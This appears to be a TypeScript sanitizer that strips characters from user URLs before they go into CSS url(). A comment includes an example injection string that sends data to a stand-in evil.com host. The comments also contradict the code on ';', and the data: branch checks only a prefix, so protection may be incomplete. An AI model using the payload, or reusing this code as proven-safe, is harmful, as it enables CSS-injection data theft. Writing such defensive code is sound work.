// utils/safeCssUrl.ts
//
// Sanitizes a URL for safe insertion into a CSS `url(...)` context.
//
// Why this exists
// ===============
// Phase 3.5 (C-01, C-02 from AUDIT_REPORT.md, 31.05.2026) closed the
// CSS-injection vector in services/quizEngine.ts (imageUrl,
// designSettings.background.imageUrl). The previous regex
//   .replace(/['"\\\\]/g,'')
// escaped single quote / double quote / backslash but NOT `)` or
// `;` or CR/LF. The `sanitizeAssetUrl()` helper added during Phase 3
// only validates the protocol — it does NOT consider CSS context.
//
// An attacker who controls `imageUrl` could craft
//   image.jpg'); background:url(https://evil.com/steal?data=...)
// `new URL()` would parse the literal string and the `)`/`;` would
// survive in the path component, then close the CSS `url()` early
// when interpolated into `url('...')`.
//
// This helper adds the missing layer:
//   1. Parse via new URL() to validate the protocol allowlist
//      (https:, http:, data:image|audio|video).
//   2. Strip CSS-special characters from the result: ' " ( ) \ ; CR LF
//      TAB. None of these can appear inside a well-formed URL and any
//      of them would break the CSS `url(...)` contract.
//   3. Return the cleaned absolute URL, or null if the input is
//      malformed / disallowed.
//
// Usage
// -----
//   const safe = safeCssUrl(userInput);
//   if (safe) el.style.backgroundImage = `url('${safe}')`;
//
// Run tests with: npm test safeCssUrl

/**
 * Returns a CSS-safe absolute URL, or null if the input cannot be
 * safely embedded in a `url(...)` literal.
 *
 * - Accepts: http(s) and data:image|audio|video only.
 * - Rejects: javascript:, vbscript:, data:text/html, blob:,
 *   filesystem:, mailto:, etc.
 * - Strips CSS-special characters that could close the url() early
 *   or smuggle a second property: ' " ( ) \ ; CR LF TAB.
 *
 * @param input Any value. Non-strings → null.
 * @param base  Optional base URL for resolving relative inputs.
 *              Defaults to `undefined` (i.e. the input must be absolute).
 *              Pass `window.location.href` if you need to accept
 *              relative paths.
 */
export function safeCssUrl(
  input: unknown,
  base?: string,
): string | null {
  if (typeof input !== "string" || !input) return null;
  if (input.length > 2048) return null; // sanity cap

  let parsed: URL;
  try {
    parsed = new URL(input, base);
  } catch {
    return null;
  }

  const proto = parsed.protocol.toLowerCase();
  if (proto === "https:" || proto === "http:") {
    // fall through to strip
  } else if (proto === "data:") {
    // Only allow data: URLs whose MIME type is a media type. The
    // browser will reject data:text/html in a CSS url() context, but
    // we don't want to even hand the browser a payload that could
    // end up reflected in a debugger / network log.
    if (!/^data:(image|audio|video)\/[a-z0-9.+\-]+/i.test(input)) {
      return null;
    }
    // For data: URLs, return the href untouched. data: URLs use ';'
    // as a delimiter between MIME and parameters (e.g. ";base64,")
    // and the CSS strip would corrupt that. The ' " ( ) \ CR LF TAB
    // are also not allowed in a well-formed data: URL, so we trust
    // the regex check above to keep them out.
    return parsed.href;
  } else {
    return null;
  }

  // CSS-context strip for http(s) URLs. The result is an absolute
  // URL produced by new URL(), so the only thing we need to defend
  // against is characters that would prematurely close the url('...')
  // literal when interpolated:
  //
  //   ' "   — close the url('...') quote
  //   ( )   — delimit url(...) parens (CSS allows `url(image.png)`
  //           without quotes; an unquoted `)` would close early)
  //   \     — CSS escape; `\` followed by a hex digit consumes the
  //           next 1-6 chars and lets an attacker break out
  //   \r \n \t — CSS whitespace; would terminate url() in unquoted form
  //
  // `;` is intentionally NOT stripped: it is a valid sub-delim in
  // http(s) URLs (matrix params, e.g. `/path;type=a`) and is not
  // meaningful to the CSS url() parser inside a quoted literal.
  const cleaned = parsed.href.replace(/['"()\\\r\n\t]/g, "");
  return cleaned;
}
